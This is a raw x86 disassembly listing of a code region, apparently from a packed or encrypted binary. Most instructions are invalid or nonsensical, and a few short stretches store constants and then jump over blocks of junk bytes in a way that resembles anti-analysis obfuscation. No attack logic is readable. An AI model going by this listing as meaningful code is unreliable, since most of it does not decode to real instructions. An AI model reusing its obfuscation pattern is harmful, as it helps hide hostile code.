  40b998:	call   DWORD PTR ds:0x6c355c77
  40b99e:	pop    esp
  40b99f:	sti    
  40b9a0:	dec    DWORD PTR ds:0xadd18b16
  40b9a6:	mov    ah,0x2
  40b9a8:	sbb    al,0x7
  40b9aa:	pop    ebx
  40b9ab:	enter  0xe23a,0x86
  40b9af:	xchg   ebp,eax
  40b9b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9b1:	sub    DWORD PTR [eax-0x1f],ebx
  40b9b4:	mov    edi,0xc912e196
  40b9b9:	mov    ebp,0xa9ba5c32
  40b9be:	out    0x48,eax
  40b9c0:	test   BYTE PTR [edi],dl
  40b9c2:	add    BYTE PTR [edi],ch
  40b9c4:	or     al,0x34
  40b9c6:	mov    eax,ds:0x6120758c
  40b9cb:	xor    BYTE PTR [ebx],0x89
  40b9ce:	and    BYTE PTR [edi],bh
  40b9d0:	popf   
  40b9d1:	mov    bh,0xdd
  40b9d3:	or     bh,BYTE PTR [ecx+ebx*2+0xb]
  40b9d7:	mov    ebp,DWORD PTR [ecx+0x74]
  40b9da:	and    dl,0xdb
  40b9dd:	sbb    ecx,DWORD PTR [edi+0x2d4f444]
  40b9e3:	mov    ds:0x6b882d8b,eax
  40b9e8:	test   DWORD PTR [esi+0x5f],ebx
  40b9eb:	out    dx,al
  40b9ec:	clc    
  40b9ed:	test   al,0x35
  40b9ef:	or     DWORD PTR [ecx-0x37c40001],eax
  40b9f5:	jmp    0x40bab7
  40b9fa:	mov    ebp,0xfed26c43
  40b9ff:	(bad)  
  40ba00:	mov    edi,0xd13eac6f
  40ba05:	imul   ebp,DWORD PTR [ecx-0x786a1cb8],0xa5000078
  40ba0f:	add    BYTE PTR [eax],al
  40ba11:	add    cl,cl
  40ba13:	lock sbb ebx,ebx
  40ba16:	popa   
  40ba17:	pop    edi
  40ba18:	test   al,0x19
  40ba1a:	and    BYTE PTR [ebp-0x18ee8ff8],0x16
  40ba21:	loop   0x40ba55
  40ba23:	iret   
  40ba24:	push   edx
  40ba25:	test   DWORD PTR [ebx-0x34553bb9],edx
  40ba2b:	jae    0x40b9bd
  40ba2d:	(bad)  
  40ba2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba2f:	xchg   eax,eax
  40ba31:	repnz lahf 
  40ba33:	psrlw  mm5,QWORD PTR [edi+ecx*8-0x20abbcc5]
  40ba3b:	or     BYTE PTR [ecx],0xbc
  40ba3e:	and    ebp,ecx
  40ba40:	popa   
  40ba41:	inc    edi
  40ba42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba44:	and    eax,0x6a3ead2b
  40ba49:	iret   
  40ba4a:	sub    DWORD PTR [eax-0x44],ecx
  40ba4d:	lock hlt 
  40ba4f:	and    bl,BYTE PTR [esi+0x71]
  40ba52:	sbb    dl,BYTE PTR [eax]
  40ba54:	fmul   st,st(3)
  40ba56:	rcr    DWORD PTR [esi-0x26],1
  40ba59:	pop    esp
  40ba5a:	xor    eax,0x59778dbb
  40ba5f:	neg    cl
  40ba61:	cs inc edx
  40ba63:	fld    DWORD PTR [ebx]
  40ba65:	push   ebx
  40ba66:	(bad)  
  40ba68:	fwait
  40ba69:	pop    es
  40ba6a:	or     esi,DWORD PTR [esi+0x18]
  40ba6d:	call   0xc6fda3fc
  40ba72:	cmp    BYTE PTR [ecx],dl
  40ba74:	inc    ebx
  40ba75:	jmp    0x28e9ed39
  40ba7a:	scas   al,BYTE PTR es:[edi]
  40ba7b:	mov    edi,ecx
  40ba7d:	adc    DWORD PTR [edi-0x21],esp
  40ba80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba81:	xor    DWORD PTR [ebx],esi
  40ba83:	out    dx,eax
  40ba84:	popa   
  40ba85:	ds push ebx
  40ba87:	dec    esi
  40ba88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba89:	test   eax,0xc8ae52f9
  40ba8e:	cmp    ebp,esi
  40ba90:	add    eax,0x8cdc9d7a
  40ba95:	in     eax,dx
  40ba96:	(bad)  
  40ba97:	popf   
  40ba98:	push   cs
  40ba99:	inc    esp
  40ba9a:	ja     0x40ba6c
  40ba9c:	cdq    
  40ba9d:	loope  0x40ba4f
  40ba9f:	test   al,0xda
  40baa1:	rcr    DWORD PTR [ebp+0x7b16fba5],1
  40baa7:	pushf  
  40baa8:	xlat   BYTE PTR ds:[ebx]
  40baa9:	or     al,0x58
  40baab:	into   
  40baac:	fwait
  40baad:	pop    ecx
  40baae:	popa   
  40baaf:	push   cs
  40bab0:	sub    BYTE PTR [ecx+0x21],ch
  40bab3:	push   ds
  40bab4:	mov    eax,0x820f3007
  40bab9:	jne    0x40bab0
  40babb:	(bad)  
  40babc:	(bad)  
  40babd:	jmp    0x40bb7f
  40bac2:	scas   eax,DWORD PTR es:[edi]
  40bac3:	or     ah,ch
  40bac5:	iret   
  40bac6:	in     eax,0xef
  40bac8:	scas   eax,DWORD PTR es:[edi]
  40bac9:	push   0x9
  40bacb:	dec    ebp
  40bacc:	mov    ch,0xbb
  40bace:	adc    ah,ah
  40bad0:	aam    0x3f
  40bad2:	sub    al,0x79
  40bad4:	add    BYTE PTR [eax],al
  40bad6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bad7:	add    BYTE PTR [eax],al
  40bad9:	add    BYTE PTR [edx-0x4e],al
  40badc:	iret   
  40badd:	xchg   esp,eax
  40bade:	xchg   BYTE PTR [esi+eiz*2],ah
  40bae1:	out    dx,eax
  40bae2:	or     DWORD PTR [eax+0x5b1e3253],ebp
  40bae8:	out    dx,eax
  40bae9:	aas    
  40baea:	les    esp,FWORD PTR [ebx]
  40baec:	ds in  al,dx
  40baee:	lock pop ebp
  40baf0:	inc    edx
  40baf1:	shl    esp,0x41
  40baf4:	loope  0x40bb04
  40baf6:	push   ebx
  40baf7:	fdivr  st(7),st
  40baf9:	xchg   edi,eax
  40bafa:	lds    ebp,FWORD PTR cs:[edi]
  40bafd:	pushf  
  40bafe:	pop    ss
  40baff:	loope  0x40ba84
  40bb01:	outs   dx,BYTE PTR ds:[esi]
  40bb02:	mov    eax,0x5f319b7f
  40bb07:	inc    eax
  40bb08:	lds    esp,FWORD PTR fs:[edx-0x80]
  40bb0c:	pop    es
  40bb0d:	ret    0x2dd1
  40bb10:	in     al,dx
  40bb11:	(bad)  
  40bb12:	cdq    
  40bb13:	push   ecx
  40bb14:	retf   0x8e78
  40bb17:	adc    BYTE PTR [ecx-0x52],al
  40bb1a:	sub    BYTE PTR [ebx],0x3f
  40bb1d:	(bad)  
  40bb1e:	jle    0x40bb9b
  40bb20:	xchg   esp,eax
  40bb21:	pop    ss
  40bb22:	and    DWORD PTR [edx-0x6c0cc173],edx
  40bb28:	mov    esi,0xbf61a2e3
  40bb2d:	xchg   DWORD PTR [edx],esp
  40bb2f:	add    al,0x91
  40bb31:	push   esi
  40bb32:	cld    
  40bb33:	test   eax,0x3dfa5e6c
  40bb38:	repnz lahf 
  40bb3a:	push   esi
  40bb3b:	jecxz  0x40bb4b
  40bb3d:	int    0x65
  40bb3f:	cld    
  40bb40:	out    0xe8,eax
  40bb42:	sub    DWORD PTR [edx],edx
  40bb44:	(bad)  [edx+ebx*4]
  40bb47:	(bad)  
  40bb48:	das    
  40bb49:	mov    ch,0x76
  40bb4b:	call   0x7027:0xa93e4e3e
  40bb52:	and    al,0x5f
  40bb54:	or     edx,ebp
  40bb56:	(bad)  
  40bb57:	pop    edx
  40bb58:	aas    
  40bb59:	push   edx
  40bb5a:	stc    
  40bb5b:	ja     0x40bb9b
  40bb5d:	cmp    eax,0x73d37487
  40bb62:	fidivr WORD PTR ds:0xfe73daff
  40bb68:	stc    
  40bb69:	int3   
  40bb6a:	cwde   
  40bb6b:	adc    dl,BYTE PTR [eax-0x76]
  40bb6e:	fs add al,0xbb
  40bb71:	mov    eax,esi
  40bb73:	xchg   edx,eax
  40bb74:	lods   al,BYTE PTR ds:[esi]
  40bb75:	imul   esi,DWORD PTR [eax-0x27],0xd0983aa0
  40bb7c:	out    0x46,al
  40bb7e:	mov    bh,0xc7
  40bb80:	inc    ebp
  40bb81:	or     bh,cl
  40bb83:	xor    DWORD PTR [eax],eax
  40bb85:	add    BYTE PTR [ecx+0x45c7cc75],cl
  40bb8b:	rcl    BYTE PTR [esi+ebp*2],1
  40bb8e:	add    BYTE PTR [eax],al
  40bb90:	jmp    0x40bc52
  40bb95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb96:	(bad)  
  40bb98:	fcmovnbe st,st(7)
  40bb9a:	sti    
  40bb9b:	scas   eax,DWORD PTR es:[edi]
  40bb9c:	jle    0x40bbc4
  40bb9e:	sub    ecx,esp
  40bba0:	sbb    al,0x7d
  40bba2:	adc    DWORD PTR ds:0x79d15f,ebp
  40bba8:	add    BYTE PTR [ebp+0x7c000000],ah
  40bbae:	hlt    
  40bbaf:	sbb    BYTE PTR [edx*1-0x1a624b9b],dl
  40bbb6:	aad    0x92
  40bbb8:	pop    esi
  40bbb9:	cdq    
  40bbba:	mov    esp,0x4faf6153
  40bbbf:	aaa    
  40bbc0:	jnp    0x40bba7
  40bbc2:	push   ecx
  40bbc3:	jmp    0xceee3cc
  40bbc8:	pop    esp
  40bbc9:	jle    0x40bc08
  40bbcb:	pop    esi
  40bbcc:	lea    ecx,[ecx]
  40bbce:	dec    ecx
  40bbcf:	xchg   edx,eax
  40bbd0:	fmul   QWORD PTR [ecx]
  40bbd2:	xor    eax,0x291761e
  40bbd7:	or     eax,0xba0bcdee
  40bbdc:	(bad)  
  40bbdd:	stos   DWORD PTR es:[edi],eax
  40bbde:	xor    esi,ebx
  40bbe0:	cdq    
  40bbe1:	pop    ebp
  40bbe2:	dec    ebp
  40bbe3:	sbb    BYTE PTR [ebx-0x44a2def2],bl
  40bbe9:	push   eax
  40bbea:	dec    ecx
  40bbeb:	and    eax,0xcf80bcf6
  40bbf0:	mov    al,0xb5
  40bbf2:	cmovb  esp,DWORD PTR [ecx]
  40bbf5:	mov    bl,0x71
  40bbf7:	cmp    cl,BYTE PTR [edx-0x5]
  40bbfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbfb:	outs   dx,BYTE PTR ds:[esi]
  40bbfc:	sub    bl,BYTE PTR [edi+0x5d1a1d7b]
  40bc02:	rcr    ch,cl
  40bc04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc05:	fcomp  QWORD PTR [ebx+0x5c]
  40bc08:	and    eax,0xc28a77b5
  40bc0d:	mov    esp,0xf375ada0
  40bc12:	out    0xd8,al
  40bc14:	cmp    DWORD PTR [ecx+0x13896b6d],ecx
  40bc1a:	lock ror BYTE PTR [esi-0x6e4cd27],1
  40bc21:	xor    BYTE PTR [edx],cl
  40bc23:	jne    0x40bc5e
  40bc25:	icebp  
  40bc26:	mov    ds:0x69f33407,eax
  40bc2b:	adc    BYTE PTR [edi+0x71],dl
  40bc2e:	cmp    bh,bl
  40bc30:	in     al,dx
  40bc31:	int3   
  40bc32:	mov    dl,0x73
  40bc34:	cs ret 
  40bc36:	jecxz  0x40bc33
  40bc38:	sete   BYTE PTR [ebx+0x33]
  40bc3c:	jp     0x40bc09
  40bc3e:	ss test al,0x3d
  40bc41:	ret    
  40bc42:	les    ebp,FWORD PTR [esi+edx*2+0x7e]
  40bc46:	js     0x40bbe6
  40bc48:	jp     0x40bc31
  40bc4a:	inc    edi
  40bc4b:	stos   BYTE PTR es:[edi],al
  40bc4c:	dec    edi
  40bc4d:	mov    ebx,0x8dd1205c
  40bc52:	mov    DWORD PTR [ebp-0x2c],0x4828
  40bc59:	mov    DWORD PTR [ebp-0x28],0x279d
  40bc60:	mov    DWORD PTR [ebp-0x4],0x5887
  40bc67:	mov    DWORD PTR [ebp-0x8],0x61c0
  40bc6e:	mov    DWORD PTR [ebp-0xc],0x3d96
  40bc75:	mov    ecx,DWORD PTR [ebp+0x8]
  40bc78:	jmp    0x40bd3a
  40bc7d:	mov    edx,ecx
  40bc7f:	mov    dl,BYTE PTR [esi-0x20622935]
  40bc85:	shl    BYTE PTR [esi],cl
  40bc87:	mov    ch,0x3f
  40bc89:	dec    edx
  40bc8a:	cmp    ecx,DWORD PTR ds:0x7a76c3
  40bc90:	add    BYTE PTR [ebp+0x73000000],ah
  40bc96:	xchg   ebx,eax
  40bc97:	jg     0x40bcad
  40bc99:	mov    WORD PTR [eax-0x182ed49d],?
  40bc9f:	jb     0x40bc62
  40bca1:	mov    bl,0xcd
  40bca3:	mov    ebx,0x5f6e532d
  40bca8:	and    edx,DWORD PTR [ecx]
  40bcaa:	mov    esi,0x648dd454
  40bcaf:	leave  
  40bcb0:	add    al,0xeb
  40bcb2:	loop   0x40bc5f
  40bcb4:	or     BYTE PTR [ecx],0x6b
  40bcb7:	add    DWORD PTR [edi-0x37b8d457],edi
  40bcbd:	test   ebp,ecx
  40bcbf:	xchg   BYTE PTR [edi+0x3a],al
  40bcc2:	adc    eax,0x67f79c60
  40bcc7:	out    0x78,al
  40bcc9:	push   edx
  40bcca:	mov    ch,0x8b
  40bccc:	retf   0x3583
  40bccf:	mov    bl,0xce
  40bcd1:	or     cl,bh
  40bcd3:	sub    esi,esi
  40bcd5:	sbb    al,0x18
  40bcd7:	rol    bl,1
  40bcd9:	add    al,0xe2
  40bcdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcdc:	push   edx
  40bcdd:	jo     0x40bcbf
  40bcdf:	loopne 0x40bcd6
  40bce1:	cmc    
  40bce2:	out    0xb1,al
  40bce4:	ror    dl,cl
  40bce6:	popf   
  40bce7:	(bad)  
  40bce8:	mov    BYTE PTR [eax-0x59],cl
  40bceb:	inc    esi
  40bcec:	sub    al,0x7e
  40bcee:	mov    ebp,0xbaa84331
  40bcf3:	mov    esp,DWORD PTR [esp+edx*8+0x9c86530]
  40bcfa:	retf   
  40bcfb:	fild   QWORD PTR [eax+0x61204fc6]
  40bd01:	fdivr  DWORD PTR [edi-0x1c]
  40bd04:	stos   DWORD PTR es:[edi],eax
  40bd05:	arpl   WORD PTR es:[edi-0x71bec2f3],di
  40bd0c:	pusha  
  40bd0d:	add    BYTE PTR [edx-0x5f90e260],0x61
  40bd14:	(bad)
  40bd17:	bound  ebx,QWORD PTR [ebx-0xc97913f]
  40bd1d:	adc    ebp,DWORD PTR ds:0xd422f75c
  40bd23:	ror    eax,0x98
  40bd26:	or     eax,0x8b220ffc
  40bd2b:	arpl   WORD PTR [ebp-0xe],di
  40bd2e:	fimul  WORD PTR ds:[ecx-0x23]
  40bd32:	mov    ds:0x5efd86f7,eax
  40bd37:	shl    DWORD PTR [ebp-0x33],0x81
  40bd3b:	leave  
  40bd3c:	jns    0x40bd8a
  40bd3e:	add    BYTE PTR [eax],al
  40bd40:	sub    ecx,0x2e31
  40bd46:	imul   ecx,ecx,0x6a76
  40bd4c:	pop    edi
  40bd4d:	xor    ecx,0x21303a60
  40bd53:	pop    ebx
  40bd54:	mov    DWORD PTR [ebp-0x20],0x6e1c
  40bd5b:	mov    DWORD PTR [ebp-0x24],0x47ff
  40bd62:	jmp    0x40be24
  40bd67:	and    BYTE PTR [esi-0x3519751a],0xec
  40bd6e:	scas   al,BYTE PTR es:[edi]
  40bd6f:	repnz rcr BYTE PTR [edi],0xbf
  40bd73:	mov    edx,0x1b5f841a
  40bd78:	jnp    0x40bd7a
  40bd7a:	add    BYTE PTR [ebp+0x44000000],ah
  40bd80:	ret    
  40bd81:	inc    eax
  40bd82:	xchg   DWORD PTR [edi-0x7e07ece4],edx
  40bd88:	(bad)  
  40bd89:	mov    ch,0xbe
  40bd8b:	popa   
  40bd8c:	mov    ah,BYTE PTR [ebp-0x7b]
  40bd8f:	leave  
  40bd90:	loope  0x40bd50
  40bd92:	mov    bl,0xae
  40bd94:	push   ds
  40bd95:	mov    eax,0x4bb34492
  40bd9a:	ins    BYTE PTR es:[edi],dx
  40bd9b:	popa   
  40bd9c:	std    
  40bd9d:	sbb    eax,0xb04bc8db
  40bda2:	or     BYTE PTR [ebx+ebp*1+0x5aaed727],ch
  40bda9:	and    al,0xf7
  40bdab:	cli    
  40bdac:	or     dl,BYTE PTR [edx-0x40]
  40bdaf:	jge    0x40be0c
  40bdb1:	cmp    ebp,DWORD PTR [ebp+0x505e0987]
  40bdb7:	stos   DWORD PTR es:[edi],eax
  40bdb8:	or     al,0x20
  40bdba:	cmp    dl,BYTE PTR [edi+0x311534fd]
  40bdc0:	push   cs
  40bdc1:	pop    ecx
  40bdc2:	push   edx
  40bdc3:	mov    ah,0x98
  40bdc5:	xor    eax,0x92197cd
  40bdca:	rcl    DWORD PTR [esi-0x1e],cl
  40bdcd:	ja     0x40be39
  40bdcf:	jnp    0x40bd9a
  40bdd1:	mov    BYTE PTR [esi+0x4d1088db],cl
  40bdd7:	pop    ds
  40bdd8:	or     DWORD PTR cs:[edi],ebp
  40bddb:	or     al,0x28
  40bddd:	call   0x233e:0x79ad267e
  40bde4:	jmp    0xfcd9f1ca
  40bde9:	test   eax,0x84d80fb1
  40bdee:	call   0xfa8f:0xcfb2eb3e
  40bdf5:	push   0xffffff88
  40bdf7:	inc    eax
  40bdf8:	cwde   
  40bdf9:	test   ecx,esi
  40bdfb:	jo     0x40be03
  40bdfd:	pop    ss
  40bdfe:	mov    ebx,edi
  40be00:	(bad)  
  40be01:	out    dx,al
  40be02:	inc    esp
  40be03:	rep outs dx,BYTE PTR ds:[esi]
  40be05:	jge    0x40bdf5
  40be07:	pushf  
  40be08:	add    BYTE PTR [ecx-0x59],ah
  40be0b:	xlat   BYTE PTR ds:[ebx]
  40be0c:	ds sub ah,ch
  40be0f:	aam    0x18
  40be11:	sub    BYTE PTR [edi-0x74],bh
  40be14:	mov    al,0xcc
  40be16:	push   ss
  40be17:	shr    DWORD PTR [ecx+ebp*4],cl
  40be1a:	sub    esp,ecx
  40be1c:	or     bl,BYTE PTR ds:0xae4da2ad
  40be22:	pop    es
  40be23:	cmp    bh,al
  40be25:	inc    ebp
  40be26:	or     BYTE PTR [ecx+edi*2],dh
  40be29:	add    BYTE PTR [eax],al
  40be2b:	jmp    0x40beed
  40be30:	dec    ebx
  40be31:	pop    ebx
  40be32:	inc    esi
  40be33:	jae    0x40be8b
  40be35:	jg     0x40beb6
  40be37:	jnp    0x40be8a
  40be39:	stos   BYTE PTR es:[edi],al
  40be3a:	mov    ecx,0xd5674274
  40be3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be40:	sar    BYTE PTR [ebx+0x0],0x0
  40be44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be45:	add    BYTE PTR [eax],al
  40be47:	add    BYTE PTR [ebp-0x5],bl
  40be4a:	mov    esi,0xe5ad0307
  40be4f:	sub    ch,BYTE PTR [ebx+0x2a9adad4]
  40be55:	inc    ecx
  40be56:	into   
  40be57:	and    dl,BYTE PTR [esi+ebp*2]
  40be5a:	push   esp
  40be5b:	dec    eax
  40be5c:	mov    DWORD PTR [esi+0x54875603],edi
  40be62:	xor    DWORD PTR [esi],0x391d98a2
  40be68:	xor    BYTE PTR fs:[eax],ah
  40be6b:	mov    dh,0x30
  40be6d:	pop    esp
  40be6e:	cmp    al,BYTE PTR [edx]
  40be70:	outs   dx,BYTE PTR ds:[esi]
  40be71:	mov    ds:0x368f60a2,eax
  40be76:	cmp    DWORD PTR [ebx],ecx
  40be78:	push   ecx
  40be79:	dec    ebp
  40be7a:	call   0xcf75f54d
  40be7f:	into   
  40be80:	repnz push cs
  40be82:	int3   
  40be83:	test   ebp,ebp
  40be85:	dec    ebp
  40be86:	cmp    eax,0x765eb3a
  40be8b:	mov    ds:0xa096cf7e,eax
  40be90:	or     DWORD PTR [edi-0x54984449],ebx
  40be96:	xchg   ebp,eax
  40be97:	mov    esp,0xc286f93
  40be9c:	fdivr  DWORD PTR [edi-0x45]
  40be9f:	add    dh,BYTE PTR [edx+0x13]
  40bea2:	and    DWORD PTR [eax+0x303bcc8d],ebx
  40bea8:	jns    0x40beb8
  40beaa:	xchg   BYTE PTR [ebp+0x34],cl
  40bead:	js     0x40be5b
  40beaf:	in     al,0x3b
  40beb1:	jmp    0x40bed7
  40beb3:	pusha  
  40beb4:	imul   BYTE PTR [eax+ebp*2]
  40beb7:	arpl   WORD PTR [esi],dx
  40beb9:	test   eax,0x391b2d3b
  40bebe:	(bad)  
  40bebf:	push   edi
  40bec0:	inc    esp
  40bec1:	push   edi
  40bec2:	js     0x40bf39
  40bec4:	add    esi,DWORD PTR [ecx+eax*1+0x4bb04f8d]
  40becb:	loopne 0x40be69
  40becd:	push   ebp
  40bece:	add    eax,0xe914e512
  40bed3:	xor    edi,DWORD PTR [edx-0x108ef471]
  40bed9:	leave  
  40beda:	adc    eax,0xf109f04e
  40bedf:	inc    ecx
  40bee0:	dec    edx
  40bee1:	aam    0xa3
  40bee3:	mov    bh,0x53
  40bee5:	repz in eax,dx
  40bee7:	push   0x9946649f
  40beec:	dec    esi
  40beed:	mov    DWORD PTR [ebp-0x10],0x7ec1
  40bef4:	mov    DWORD PTR [ebp-0x14],0x2110
  40befb:	jmp    0x40bfbd
  40bf00:	shl    DWORD PTR [edx+0xe],0x88
  40bf04:	mov    edi,0x377bc7fc
  40bf09:	in     eax,dx
  40bf0a:	loope  0x40beea
  40bf0c:	imul   ebp,esp,0xffffff92
  40bf0f:	xor    esp,DWORD PTR [ebp+0x7c]
  40bf12:	add    BYTE PTR [eax],al
  40bf14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf15:	add    BYTE PTR [eax],al
  40bf17:	add    ch,bh
  40bf19:	int3   
  40bf1a:	loope  0x40beb8
  40bf1c:	mov    ebx,0xe0f213ea
  40bf21:	inc    ebp
  40bf22:	pop    ecx
  40bf23:	cld    
  40bf24:	mov    DWORD PTR [ebp+0x67],eax
  40bf27:	inc    edx
  40bf28:	xor    bh,BYTE PTR [esi+0x4b9b208c]
  40bf2e:	aas    
  40bf2f:	retf   0x282
  40bf32:	mov    ah,0xe8
  40bf34:	dec    esp
  40bf35:	xor    esp,DWORD PTR [ebp+0x4]
  40bf38:	mov    ah,0x87
  40bf3a:	into   
  40bf3b:	or     al,0x45
  40bf3d:	cmc    
  40bf3e:	repz pop esp
  40bf40:	sbb    ah,BYTE PTR cs:[eax+0x5f3ce011]
  40bf47:	cs scas eax,DWORD PTR es:[edi]
  40bf49:	aas    
  40bf4a:	popf   
  40bf4b:	xchg   esp,eax
  40bf4c:	cld    
  40bf4d:	stc    
  40bf4e:	test   ecx,esi
  40bf50:	imul   esi,DWORD PTR [ecx+0x49],0x1
  40bf54:	xlat   BYTE PTR ds:[ebx]
  40bf55:	mov    ebp,0x88711fca
  40bf5a:	mov    dh,0x1e
  40bf5c:	or     ch,BYTE PTR [ebp+0x6ec8c12c]
  40bf62:	stc    
  40bf63:	dec    edi
  40bf64:	inc    edi
  40bf65:	(bad)  
  40bf66:	fidiv  WORD PTR [esi+eiz*4-0x7c966955]
  40bf6d:	dec    edx
  40bf6e:	retf   
  40bf6f:	push   es
  40bf70:	das    
  40bf71:	jns    0x40bf1f
  40bf73:	call   0xa3:0x61ceda60
  40bf7a:	shl    BYTE PTR [esi-0xa],1
  40bf7d:	pop    esp
  40bf7e:	(bad)  
  40bf7f:	stc    
  40bf80:	sub    BYTE PTR [edx+0x6a],dl
  40bf83:	test   dh,cl
  40bf85:	aad    0xa7
  40bf87:	hlt    
  40bf88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf89:	fcmovne st,st(3)
  40bf8b:	cmp    al,BYTE PTR [edx+0x1768568]
  40bf91:	mov    eax,ds:0xaf47f96a
  40bf96:	cmp    al,0xbe
  40bf98:	int3   
  40bf99:	jp     0x40bf88
  40bf9b:	ficomp DWORD PTR [esp+esi*8-0x90bfe55]
  40bfa2:	fidiv  DWORD PTR ds:0x1bd27156
  40bfa8:	cmp    DWORD PTR [eax-0x64],edi
  40bfab:	jmp    0x716:0x37fe73b4
  40bfb2:	in     eax,dx
  40bfb3:	jbe    0x40bf55
  40bfb5:	cmp    edi,DWORD PTR [bx+0x782b]
  40bfba:	mov    eax,ds:0x45c7e21f
  40bfbf:	call   0x411ff1
  40bfc4:	mov    DWORD PTR [ebp-0x1c],0x6ee0
  40bfcb:	jmp    0x40c08d
  40bfd0:	inc    edi
  40bfd1:	cmp    DWORD PTR [edi-0x102900ba],ebp
  40bfd7:	cmp    ebx,edx
  40bfd9:	aaa    
  40bfda:	push   edi
  40bfdb:	ret    
  40bfdc:	test   BYTE PTR [ebx-0x37],dh
  40bfdf:	dec    esi
  40bfe0:	or     bh,BYTE PTR [ebp+0x0]
  40bfe3:	add    BYTE PTR [ebp-0x45000000],ah
  40bfe9:	push   ecx
  40bfea:	and    eax,0xa171749d
  40bfef:	sti    
  40bff0:	sub    edi,DWORD PTR [esi-0x4d483242]
  40bff6:	retf   
  40bff7:	jl     0x40bfe1
  40bff9:	dec    edi
  40bffa:	xor    BYTE PTR [eax+0x16226609],0x3f
  40c001:	cmp    DWORD PTR [eax-0x40],esp
  40c004:	je     0x40c03d
  40c006:	stos   DWORD PTR es:[edi],eax
  40c007:	mov    DWORD PTR [edx+0x2b],eax
  40c00a:	leave  
  40c00b:	pushf  
  40c00c:	or     BYTE PTR [eax-0x6e1f60db],al
  40c012:	and    ch,BYTE PTR [ebx]
  40c014:	lea    edi,[eax+0xc]
  40c017:	in     al,0x73
  40c019:	xchg   edi,eax
  40c01a:	lods   eax,DWORD PTR ds:[esi]
  40c01b:	inc    DWORD PTR [esi+0x20]
  40c01e:	mov    al,0x4f
  40c020:	scas   al,BYTE PTR es:[edi]
  40c021:	jl     0x40bfb5
  40c023:	in     al,0xac
  40c025:	test   BYTE PTR [edi+eiz*1+0x5290dd07],bh
  40c02c:	jg     0x40c01b
  40c02e:	pop    ecx
  40c02f:	xor    al,0xcd
  40c031:	xor    ebp,DWORD PTR [edx+0x5]
  40c034:	pop    es
  40c035:	add    eax,0xd354fd23
  40c03a:	scas   eax,DWORD PTR es:[edi]
  40c03b:	pop    ebp
  40c03c:	inc    DWORD PTR [ecx+eiz*4+0x44]
  40c040:	adc    DWORD PTR [edx],ebp
  40c042:	shl    DWORD PTR [edx+ebx*8+0x3e],1
  40c046:	in     eax,dx
  40c047:	int3   
  40c048:	ins    BYTE PTR es:[edi],dx
  40c049:	aam    0x7a
  40c04b:	test   BYTE PTR [edi],0xbd
  40c04e:	mov    esp,0x75990e2c
  40c053:	jae    0x40c0c5
  40c055:	(bad)  
  40c056:	pop    ds
  40c057:	or     edx,DWORD PTR [ebx+0x6d]
  40c05a:	aad    0x8
  40c05c:	push   eax
  40c05d:	sbb    eax,0xf0f4788e
  40c062:	jb     0x40c055
  40c064:	xlat   BYTE PTR ds:[ebx]
  40c065:	mov    ?,WORD PTR [ebx-0x28]
  40c068:	xchg   edi,eax
  40c069:	pop    es
  40c06a:	cmp    al,0x14
  40c06c:	inc    ebx
  40c06d:	dec    eax
  40c06e:	cdq    
  40c06f:	popf   
  40c070:	adc    esp,DWORD PTR [ecx+0x4a33b3c5]
  40c076:	sub    al,0x65
  40c078:	rol    BYTE PTR [edx],1
  40c07a:	xchg   edx,eax
  40c07b:	sbb    al,0x21
  40c07d:	sar    DWORD PTR [esi+ecx*8-0x37058ac9],1
  40c084:	adc    ah,BYTE PTR [edx]
  40c086:	add    BYTE PTR ds:[esp+esi*8],0x8c
  40c08b:	outs   dx,BYTE PTR ds:[esi]
  40c08c:	ror    BYTE PTR [ebx+0x45030845],0xdc
  40c093:	mov    edx,DWORD PTR [ebp-0x20]
  40c096:	or     eax,0x4d6f
  40c09b:	and    eax,edx
  40c09d:	jmp    0x40c15f
  40c0a2:	scas   al,BYTE PTR es:[edi]
  40c0a3:	std    
  40c0a4:	loopne 0x40c0c1
  40c0a6:	repz pop ds
  40c0a8:	(bad)  
  40c0a9:	std    
  40c0aa:	xor    ebx,DWORD PTR [ebp+ebx*1-0x41]
  40c0ae:	sub    BYTE PTR [edx+0x7daf0d50],bh
  40c0b4:	add    BYTE PTR [eax],al
  40c0b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0b7:	add    BYTE PTR [eax],al
  40c0b9:	add    BYTE PTR [edi-0x6a],bl
  40c0bc:	adc    dh,BYTE PTR [esi+0x36]
  40c0bf:	cmp    BYTE PTR [ecx-0xf],dl
  40c0c2:	nop
  40c0c3:	faddp  st(4),st
  40c0c5:	fwait
  40c0c6:	push   ds
  40c0c7:	xlat   BYTE PTR ds:[ebx]
  40c0c8:	mov    bh,0xb4
  40c0ca:	adc    ah,cl
  40c0cc:	xchg   ebx,eax
  40c0cd:	retf   
  40c0ce:	in     al,0x82
  40c0d0:	dec    esp
  40c0d1:	mov    WORD PTR ds:0x41b94aeb,ds
  40c0d7:	and    al,0x65
  40c0d9:	inc    ecx
  40c0da:	xor    cl,ch
  40c0dc:	sbb    BYTE PTR [ebp-0x40],0x2
  40c0e0:	add    esi,esi
  40c0e2:	je     0x40c117
  40c0e4:	push   0xffffffee
  40c0e6:	outs   dx,DWORD PTR ds:[esi]
  40c0e7:	scas   eax,DWORD PTR es:[edi]
  40c0e8:	movlps QWORD PTR [ecx+0x75],xmm0
  40c0ec:	xor    al,0xc2
  40c0ee:	inc    ebx
  40c0ef:	imul   DWORD PTR [ecx]
  40c0f1:	(bad)  
  40c0f2:	shl    ah,cl
  40c0f4:	pop    esi
  40c0f5:	mov    edi,0x5962bf03
  40c0fa:	sub    dl,dl
  40c0fc:	leave  
